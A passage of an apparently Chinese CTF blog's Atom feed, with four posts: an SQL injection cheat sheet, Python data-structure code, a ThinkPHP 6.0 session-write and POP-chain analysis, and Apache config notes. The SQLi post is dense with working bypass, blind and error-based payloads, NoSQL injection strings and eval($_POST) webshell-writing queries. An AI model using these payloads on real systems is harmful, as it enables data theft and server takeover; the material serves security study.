-&lt;div style=&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;&gt;
-&lt;iframe src=&quot;//player.bilibili.com/player.html?aid=90514239
-      
-    
-    </summary>
-    
-    
-      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
-    
-    
-      <category term="POP" scheme="http://prontosil.com/tags/POP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQL注入总结</title>
-    <link href="http://prontosil.com/posts/9b13a55/"/>
-    <id>http://prontosil.com/posts/9b13a55/</id>
-    <published>2020-03-17T14:35:41.000Z</published>
-    <updated>2020-04-03T14:20:41.726Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="常用的绕过手段"><a href="#常用的绕过手段" class="headerlink" title="常用的绕过手段"></a>常用的绕过手段</h2><h3 id="字符型过滤单引号"><a href="#字符型过滤单引号" class="headerlink" title="字符型过滤单引号"></a>字符型过滤单引号</h3><ul><li>字符串转换函数绕过</li></ul><pre><code>char()</code></pre><ul><li>十六进制数绕过</li></ul><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><p>between, like, &lt;, &gt;，regexp 绕过</p><pre><code>1 union select 1, table_name from information_schema.tables where table_name = &#39;users&#39;select 1, table_name from information_schema.tables where table_name between &#39;u&#39; and &#39;v&#39;;select 1, table_name from information_schema.tables where table_name like &#39;u%&#39;;</code></pre><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><pre><code># %23-- 后面要加空格/**/ 只加前半个也行;%00 Nullbyte` Backtick</code></pre><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号</p><pre><code>select substr(database() from 1 for 1);select mid(database() from 1 for 1);</code></pre><p>使用join(连接表的查询结果)</p><pre><code class="sql">union select 1,2     #等价于union select * from (select 1)a join (select 2)bmysql&gt; SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e);+---+---+---+---+---+| 1 | 2 | 3 | 4 | 5 |+---+---+---+---+---+| 1 | 2 | 3 | 4 | 5 |+---+---+---+---+---+1 row in set (0.00 sec)</code></pre><p>使用like</p><pre><code class="sql">select ascii(mid(user(),1,1))=80   #等价于select user() like &#39;r%&#39;mysql&gt; select user() like &#39;r%&#39;;+------------------+| user() like &#39;r%&#39; |+------------------+|                1 |+------------------+1 row in set (0.00 sec)</code></pre><p>对于 <code>limit</code> 可以使用 offset绕过</p><pre><code class="sql">select * from news limit 0,1# 等价于下面这条SQL语句select * from news limit 1 offset 0</code></pre><h3 id="lt-，-gt-被过滤"><a href="#lt-，-gt-被过滤" class="headerlink" title="&lt;，&gt;被过滤"></a>&lt;，&gt;被过滤</h3><ul><li>greatest函数绕过</li></ul><blockquote><p>greatest(a,b)，返回a和b中较大的那个数</p></blockquote><pre><code># 猜解user()第一个字符的ascii码是否小于等于150时ascii(mid(user(),1,1)) &lt;= 150=greatest(ascii(mid(user(),1,1)), 150)=150;</code></pre><h3 id="过滤and，or可以使用-amp-amp-和"><a href="#过滤and，or可以使用-amp-amp-和" class="headerlink" title="过滤and，or可以使用&amp;&amp;和||"></a>过滤and，or可以使用&amp;&amp;和||</h3><h3 id="单引号逃逸"><a href="#单引号逃逸" class="headerlink" title="单引号逃逸"></a>单引号逃逸</h3><ul><li>\</li></ul><pre><code># 用户名为usernameSQL&gt; select * from db where name=&#39;username\&#39; and passwd=&#39; or 1=1#</code></pre><h3 id="注释符-1"><a href="#注释符-1" class="headerlink" title="注释符"></a>注释符</h3><pre><code># %23-- 后面要加空格/**/ 只加前半个也行;%00 Nullbyte` Backtick</code></pre><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><p>利用数值计算盲注或时间盲注</p><pre><code>|| ascii(mid(user(),1,1) ) = 97 %23</code></pre><h3 id="绕过-information-被过滤"><a href="#绕过-information-被过滤" class="headerlink" title="绕过 information 被过滤"></a>绕过 information 被过滤</h3><ol><li>MySQL 5.7之后的版本，在其自带的 mysql 库中，新增了<code>innodb_table_stats</code> 和<code>innodb_index_stats</code>这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息 。<br>如果waf掉了<code>information</code>我们可以利用这两个表注入数据库名和表名。</li><li>参考 <a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a></li></ol><p>MySQl5.7的新特性</p><ul><li>sys.schema_auto_increment_columns  该视图的作用简单来说就是用来对表自增ID的监控。</li><li>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer</li></ul><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>数据库如下</p><pre><code>mysql&gt; select * from user;+----+----------+----------------------------------+| id | username | password                         |+----+----------+----------------------------------+|  1 | zz       | 25ed1bcb423b0b7200f485fc5ff71c8e |+----+----------+----------------------------------+1 row in set (0.00 sec)</code></pre><p>测试</p><pre><code>mysql&gt; select password from user where id=1 and  (select hex(substr(database(), 1,1)) &gt; 20) and sleep(2);Empty set (2.00 sec)mysql&gt; select password from user where id=1 and  (select hex(substr(database(), 1,1)) &gt; 89) and sleep(2);Empty set (0.00 sec)</code></pre><p>我们这么来理解多语句的and</p><p>数据库会每次取出一行数据，然后做判断，首先 <code>id=1</code> 成立，然后 判断<code>(select hex(substr(database(), 1,1)) &gt; 20)</code> </p><p>如果这个成立，就会执行接下来的 <code>sleep(2)</code> 如果不成立，那么直接over了。不会有延时</p><h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><p>order by 后的数字可以作为一个注入点</p><p>报错注入</p><pre><code>mysql&gt; select * from flag order by 1 and (updatexml(1,concat(0x7e,(select user())),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39;</code></pre><p>时间盲注</p><pre><code>select * from flag order by 1 and if(1=1,sleep(3), NULL);</code></pre><h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。</p><p>报错注入</p><pre><code>mysql&gt; select * from users where id&gt;1 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.53&#39;</code></pre><p>时间注入</p><pre><code>select * from users where id&gt;1 order by id limit 1,1 procedure analyse((select extractvalue (rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);</code></pre><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p><a href="https://buuoj.cn/challenges#[SWPU2019]Web1" target="_blank" rel="noopener">例题链接</a></p><blockquote><p>过滤了空格和or，并且没办法绕过过滤or</p><p>同时不知道列名</p><p>payload: <code>1&#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></p></blockquote><p>这样在不知道列名的情况下，就可以给每一列取一个别名了</p><pre><code>mysql&gt; select 1,2,3 union select * from user;+---+-------+--------+| 1 | 2     | 3      |+---+-------+--------+| 1 | 2     | 3      || 1 | admin | mysql  || 2 | hhh   | 123    || 3 | aaaaa | cccccc |+---+-------+--------+4 rows in set (0.00 sec)</code></pre><p>查询</p><pre><code>mysql&gt; select group_concat(b) from (select 1,2,3 as b union select * from user)a;+--------------------+| group_concat(b)    |+--------------------+| 3,mysql,123,cccccc |+--------------------+1 row in set (0.00 sec)</code></pre><p>查询两列数据</p><pre><code>select concat(`2`,0x3a,`3`) from (select 1,2,3 union select * from users)a;</code></pre><p>查询一行数据</p><pre><code>select `2` from (select 1,2,3 union select * from users)a limit 1,1;</code></pre><p><a href="https://www.jianshu.com/p/6eba3370cfab" target="_blank" rel="noopener">无列名注入参考</a></p><p><strong>使用join进行无列名注入</strong></p><p>这样就能依次把列名都爆出来了</p><pre><code>mysql&gt; select * from user;+---------+-----------+-----------+| user_id | user_name | user_pass |+---------+-----------+-----------+|       1 | admin     | mysql     ||       2 | hhh       | 123       ||       3 | aaaaa     | cccccc    |+---------+-----------+-----------+3 rows in set (0.00 sec)mysql&gt; select*from (select * from user as a join user b)c;ERROR 1060 (42S21): Duplicate column name &#39;user_id&#39;mysql&gt; select*from (select * from user as a join user b using(user_id))c;ERROR 1060 (42S21): Duplicate column name &#39;user_name&#39;</code></pre><h2 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h2><p>以mongodb为例</p><pre><code>db.collection.find(query, projection)//query 可选，使用查询操作符指定查询条件//可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）举例：//查找username为JrXnm的信息db.user.find({&#39;username&#39;:&#39;JrXnm&#39;}) </code></pre><p>第一种是按照语言的分类：php数组注入、js注入、mongo shell拼接注入。</p><p>第二种是按照攻击机制分类：永真式、联合查询、Js注入、盲注等。</p><p>PHP永真式注入</p><pre><code>$data = array(    &#39;username&#39; =&gt;  $_REQUEST[&#39;username&#39;],    &#39;password&#39; =&gt;  $_REQUEST[&#39;password&#39;]); $cursor = $collection-&gt;find($data);</code></pre><p>但是由于php松散结构的特性，如果我们_GET传入的是数组那么，会自动被解析成字典。比如我们输入<code>?username[$ne]=1&amp;password[$ne]=1</code>， 就会被解析成：</p><pre><code>{    &#39;username&#39;: {        &#39;$ne&#39;: &#39;1&#39;    },    &#39;password&#39;: {        &#39;$ne&#39;: &#39;1&#39;    }}</code></pre><p>这样就能查询到所有用户信息</p><p>Js注入</p><pre><code>$collection = $db-&gt;users;$query_body =&quot;        function q() {            var username = &#39;&quot;.$_REQUEST[&quot;username&quot;].&quot;&#39;;            var password = &#39;&quot;.$_REQUEST[&quot;password&quot;].&quot;&#39;;if(username == &#39;secret_user&#39;&amp;&amp;password == &#39;secret_password&#39;) return true; else{ return false;}}&quot;; $result = $collection-&gt;find(array(&#39;$where&#39;=&gt;$query_body));$count = $result-&gt;count();if($count&gt;0){    echo $doc_succeed-&gt;saveHTML();}</code></pre><p><code>$where</code>操作符表示执行其中的Js内容，返回True的话返回所有内容。</p><p>我们可以看到我们可以注入使得Js代码提前返回True</p><p>payload：<code>?username=qwer&amp;password= 1&#39;;return true;var qwer=&#39;1</code></p><h2 id="MySQL利用方式"><a href="#MySQL利用方式" class="headerlink" title="MySQL利用方式"></a>MySQL利用方式</h2><h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><h4 id="联合查询写shell"><a href="#联合查询写shell" class="headerlink" title="联合查询写shell"></a>联合查询写shell</h4><pre><code>UNION+ALL+SELECT+1,2,’&lt;? phpinfo(); ?&gt;’ into outfile ‘G:/2.txt’ %23</code></pre><h4 id="非联合查询写shell"><a href="#非联合查询写shell" class="headerlink" title="非联合查询写shell"></a>非联合查询写shell</h4><pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 into outfile ‘G:/2.txt’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23</code></pre><h4 id="使用日志写shell"><a href="#使用日志写shell" class="headerlink" title="使用日志写shell"></a>使用日志写shell</h4><pre><code class="p">set global general_log = on;开启日志监测，一般是关闭的，如果一直开，文件会很大的。set global general_log_file = ‘G:/2.txt’;这里设置我们需要写入的路径就可以了。select ‘&lt;?php eval($_POST[‘shiyan’]);?&gt;’;查询一个一句话，这个时候log日志里就会记录这个。set global general_log_file = ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;结束后，再修改为原来的路径。set global general_log = off;关闭下日志记录。</code></pre><h4 id="延时注入写shell"><a href="#延时注入写shell" class="headerlink" title="延时注入写shell"></a>延时注入写shell</h4><pre><code>select sleep(2),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; into outfile &#39;d:\\success.txt&#39;;</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;常用的绕过手段&quot;&gt;&lt;a href=&quot;#常用的绕过手段&quot; class=&quot;headerlink&quot; title=&quot;常用的绕过手段&quot;&gt;&lt;/a&gt;常用的绕过手段&lt;/h2&gt;&lt;h3 id=&quot;字符型过滤单引号&quot;&gt;&lt;a href=&quot;#字符型过滤单引号&quot; class=&quot;headerli
-      
-    
-    </summary>
-    
-    
-      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
-    
-    
-      <category term="SQL注入" scheme="http://prontosil.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>python数据结构</title>
-    <link href="http://prontosil.com/posts/7f8e2ad4/"/>
-    <id>http://prontosil.com/posts/7f8e2ad4/</id>
-    <published>2020-03-17T13:29:33.000Z</published>
-    <updated>2020-03-17T14:14:47.958Z</updated>
-    
-    <content type="html"><![CDATA[<p>补充一个小知识</p><p>python 输入重定向为文件</p><pre><code>import syssys.stdin = open(&quot;test.txt&quot;)</code></pre><p>之后就可以直接从文件读入，不需要手动输入了</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><pre><code>实现链表输入1 3 5 4 1 9 4 将其存储为链表格式</code></pre><p>链表数据结构：</p><pre><code class="python">class ListNode:    def __init__(self, x=-1):        self.val = x        self.next = None</code></pre><h3 id="创建链表，返回头节点-尾插法"><a href="#创建链表，返回头节点-尾插法" class="headerlink" title="创建链表，返回头节点 (尾插法)"></a>创建链表，返回头节点 (尾插法)</h3><pre><code class="python">def creat_list(line:list) -&gt; ListNode:    root = ListNode()    tail = root    for i in line:        temp = ListNode(i)        tail.next = temp        tail = tail.next      return root.next</code></pre><h3 id="遍历链表"><a href="#遍历链表" class="headerlink" title="遍历链表"></a>遍历链表</h3><pre><code class="python">def traverse_list(root:ListNode):    &#39;&#39;&#39;    遍历链表，没有头节点    &#39;&#39;&#39;    temp = root    while temp:        print(temp.val+&quot; &quot;,end=&quot;&quot;)        temp = temp.next    print()</code></pre><h3 id="删除倒数第n个节点，一次遍历"><a href="#删除倒数第n个节点，一次遍历" class="headerlink" title="删除倒数第n个节点，一次遍历"></a>删除倒数第n个节点，一次遍历</h3><p>用两个指针指向，第一个指针先走 <code>n+1</code> 步，中间空出n个节点，然后删除即可</p><pre><code class="python">def removeNthFromEnd(head:ListNode, n:int)-&gt;ListNode:    &#39;&#39;&#39;    一次遍历算法    &#39;&#39;&#39;    new_head = ListNode(-1)    new_head.next = head    first = new_head    second = new_head    for i in range(n+1):        first = first.next        while first != None:        first = first.next        second = second.next    second.next = second.next.next    return new_head.next</code></pre><h3 id="向右旋转链表"><a href="#向右旋转链表" class="headerlink" title="向右旋转链表"></a>向右旋转链表</h3><p>就是把单链表组成一个循环链表</p><pre><code class="python">def rotateRight(head:ListNode, k:int)-&gt;ListNode:    &#39;&#39;&#39;    针对链表进行旋转    &#39;&#39;&#39;    if k == 0:        return head    if head == None:        return head    temp = head    length = 0    while temp.next != None:        length += 1        temp = temp.next    length += 1    temp.next = head    temp = head    for i in range((length - k%length -1)):        temp = temp.next    new_head = temp.next    temp.next = None    return new_head</code></pre><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="创建图"><a href="#创建图" class="headerlink" title="创建图"></a>创建图</h3><p>采用邻接表进行存储， <code>ArcNode</code> 代表邻接点， <code>VNode</code> 代表边节点</p><pre><code class="python">class ArcNode:    def __init__(self,adjvex, weight):        self.adjvex = adjvex        self.weight = weight        self.next = Noneclass VNode:    def __init__(self):        self.next = None</code></pre><p>输入数据</p><pre><code>输入格式：4 40 1 1 01 0 1 01 1 0 11 1 1 1</code></pre><p>读入数据，创建邻接矩阵</p><pre><code class="python">def create_table()-&gt;list:    m,n = [int(i) for i in input().split()] # 自动解包    A = [0 for i in range(m)]    for i in range(m):        A[i] = [int(j) for j in input().split()]    return A</code></pre><p>邻接矩阵转换为邻接表</p><pre><code class="python">def create_Adj(A)-&gt;list:    &#39;&#39;&#39;    邻接矩阵转换为邻接表    &#39;&#39;&#39;    G = [VNode() for i in range(len(A))]    for i,vex in enumerate(A):        # 第i个节点，及其所有的边        for node,j in enumerate(vex):            if j != 0:                p = ArcNode(node, j)                p.next = G[i].next                G[i].next = p    return G</code></pre><p>打印邻接表</p><pre><code class="python">def disp_adj(G):    for index,i in enumerate(G):        p = i.next        print(index, end=&quot;&quot;)        while p != None:            print(&quot; {}-&gt;&quot;.format(p.adjvex), end=&quot;&quot;)            p = p.next        print()</code></pre><h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><pre><code class="python">visited = [0 for i in range(4)]def DFS(G, v):    &#39;&#39;&#39;    深度优先搜索    &#39;&#39;&#39;    visited[v] = 1    print(v, end=&quot;&quot;)    p = G[v].next    while p != None:        w = p.adjvex        if visited[w] == 0:            DFS(G,w)        p = p.next    print()</code></pre><h3 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h3><pre><code class="python">def BFS(G, v):    &#39;&#39;&#39;    广度优先搜索    &#39;&#39;&#39;    q = Queue()    visited = [0 for i in range(len(G))]    print(v,end=&quot;&quot;)    visited[v] = 1    q.put(v)    while not q.empty():        w = q.get()        p = G[w].next        while p!=None:            if visited[p.adjvex] == 0:                print(p.adjvex, end=&quot;&quot;)                visited[p.adjvex] = 1                q.put(p.adjvex)            p = p.next    print()</code></pre><h3 id="Dijkstar-算法"><a href="#Dijkstar-算法" class="headerlink" title="Dijkstar 算法"></a>Dijkstar 算法</h3><pre><code class="python">def Dijkstra(A, v):    &#39;&#39;&#39;    Dijkstar 算法    &#39;&#39;&#39;    for i in A:        for index,value in enumerate(i):            if value == -1:                i[index] = sys.maxsize    dist = A[v] # 原始v到各个顶点的距离    path = [0 for i in range(len(A))]     for i in range(len(A)):        if A[v][i] != -1:            path[i] = v        else:            path[i] = -1    s = [0 for i in range(len(A))]    s[v] = 1    for i in range(len(A)):        mindis = sys.maxsize        # 寻找最小路径长度顶点u        for j in range(len(A)):            if s[j] == 0  and dist[j] &lt; mindis:                u = j                mindis = dist[j]        s[u] = 1        for j in range(len(A)):            if s[j] == 0:                if A[u][j] &lt; sys.maxsize and dist[j] &gt; 0 and dist[u]+A[u][j] &lt; dist[j]:                    dist[j] = dist[u] + A[u][j]                    path[j] = u    return path, dist</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;补充一个小知识&lt;/p&gt;
-&lt;p&gt;python 输入重定向为文件&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;import sys
-
-sys.stdin = open(&amp;quot;test.txt&amp;quot;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后就可以直接从文件读入，不需要手动输入了&lt;/p&gt;
-      
-    
-    </summary>
-    
-    
-      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
-    
-    
-      <category term="python" scheme="http://prontosil.com/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>thinkphp6.0漏洞分析</title>
-    <link href="http://prontosil.com/posts/314a66d3/"/>
-    <id>http://prontosil.com/posts/314a66d3/</id>
-    <published>2020-03-17T12:33:18.000Z</published>
-    <updated>2020-03-17T14:14:47.961Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="通过session写文件"><a href="#通过session写文件" class="headerlink" title="通过session写文件"></a>通过session写文件</h2><p>漏洞点位于：<code>/think/session/Store.php</code></p><pre><code class="php">    /**     * session_id设置     * @access public     * @param string $id session_id     * @return void     */    public function setId($id = null): void    {        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    }</code></pre><p>针对sessionid的校验不严</p><p><img src="/posts/314a66d3/1584448906099.png" alt></p><p>之后初始化session</p><p><img src="/posts/314a66d3/1584448927094.png" alt></p><p>保存session的过程： <code>think/session/Store.php</code></p><pre><code class="php">    /**     * 保存session数据     * @access public     * @return void     */    public function save(): void    {        $this-&gt;clearFlashData();        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) {            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        } else {            $this-&gt;handler-&gt;delete($sessionId);        }        $this-&gt;init = false;    }</code></pre><p>进入到 <code>write</code> 函数写入</p><p>最后存储到文件中</p><p><img src="/posts/314a66d3/1584449025846.png" alt></p><p>这样，如果我能控制session的数组中的某个值，就能直接写入shell</p><p>成功写入：</p><p><img src="/posts/314a66d3/1584449183704.png" alt></p><h2 id="6-0-POP链分析"><a href="#6-0-POP链分析" class="headerlink" title="6.0 POP链分析"></a>6.0 POP链分析</h2><p>入口</p><p><img src="/posts/314a66d3/1584451502585.png" alt></p><p>进入 <code>save</code> 函数</p><p><img src="/posts/314a66d3/1584451535191.png" alt></p><p>继续步入</p><p><img src="/posts/314a66d3/1584451560678.png" alt></p><p>进入到 <code>cleanContents</code> 函数，直接返回原值(没有过滤因为不是多维数组)</p><pre><code class="php">    public function cleanContents(array $contents)    {        $cachedProperties = array_flip([            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,        ]);        foreach ($contents as $path =&gt; $object) {            if (is_array($object)) {                $contents[$path] = array_intersect_key($object, $cachedProperties);            }        }        return $contents;    }</code></pre><p>返回</p><p><img src="/posts/314a66d3/1584451622290.png" alt></p><p>跟进 <code>set</code> 函数，这里的 <code>$this-&gt;store</code> 已经被覆盖为 File 类</p><p><img src="/posts/314a66d3/1584451656966.png" alt></p><p><img src="/posts/314a66d3/1584451671730.png" alt></p><p>最后有两个利用方式：</p><ol><li><pre><code class="php"> protected function serialize($data): string {     if (is_numeric($data)) {         return (string) $data;     }     $serialize = $this-&gt;options[&#39;serialize&#39;][0] ?? &quot;\Opis\Closure\serialize&quot;;     return $serialize($data); }</code></pre></li></ol><ol start="2"><li><p>利用伪协议任意文件写入</p></li></ol><p><img src="/posts/314a66d3/1584451721156.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;通过session写文件&quot;&gt;&lt;a href=&quot;#通过session写文件&quot; class=&quot;headerlink&quot; title=&quot;通过session写文件&quot;&gt;&lt;/a&gt;通过session写文件&lt;/h2&gt;&lt;p&gt;漏洞点位于：&lt;code&gt;/think/session/Sto
-      
-    
-    </summary>
-    
-    
-      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
-    
-    
-      <category term="thinkphp" scheme="http://prontosil.com/tags/thinkphp/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>apache配置文件简单记录</title>
-    <link href="http://prontosil.com/posts/a3f2ee6b/"/>
-    <id>http://prontosil.com/posts/a3f2ee6b/</id>
-    <published>2020-03-14T13:23:42.000Z</published>
-    <updated>2020-03-15T11:42:38.520Z</updated>
-    
-    <content type="html"><![CDATA[<p>一直不太清楚apache的配置文件，简单记录一下</p><p><code>/etc/apache2</code> 下的文件</p><p><code>apache2.conf</code> 是主配置文件，之后的 <code>available</code> 代表可用的, <code>enable</code> 代表已经启用的</p><p><img src="/posts/a3f2ee6b/1584192313504.png" alt></p><p><code>sites-enabled</code> 下</p><p><img src="/posts/a3f2ee6b/1584192394696.png" alt></p><p>000-default.conf 文件规定了网站根目录</p><pre><code>&lt;VirtualHost *:80&gt;        # The ServerName directive sets the request scheme, hostname and port that        # the server uses to identify itself. This is used when creating        # redirection URLs. In the context of virtual hosts, the ServerName        # specifies what hostname must appear in the request&#39;s Host: header to        # match this virtual host. For the default virtual host (this file) this        # value is not decisive as it is used as a last resort host regardless.        # However, you must set it for any further virtual host explicitly.        #ServerName www.example.com        ServerAdmin webmaster@localhost        DocumentRoot /var/www/html        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,        # error, crit, alert, emerg.        # It is also possible to configure the loglevel for particular        # modules, e.g.        #LogLevel info ssl:warn        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined        # For most configuration files from conf-available/, which are        # enabled or disabled at a global level, it is possible to        # include a line for only one particular virtual host. For example the        # following line enables the CGI configuration for this host only        # after it has been globally disabled with &quot;a2disconf&quot;.        #Include conf-available/serve-cgi-bin.conf&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre><p><code>/etc/apache2/mods-enabled /mime.conf</code> 中配置了可以解析的文件类型</p><p><img src="/posts/a3f2ee6b/1584192584702.png" alt></p><p>这样就能解析 php5 等的后缀了</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;一直不太清楚apache的配置文件，简单记录一下&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;/etc/apache2&lt;/code&gt; 下的文件&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;apache2.conf&lt;/code&gt; 是主配置文件，之后的 &lt;code&gt;available&lt;/code&gt; 代表可用的, 
-      
-    
-    </summary>
-    
-    
-      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
-    
-    
-      <category term="apache" scheme="http://prontosil.com/tags/apache/"/>
     
   </entry>
   
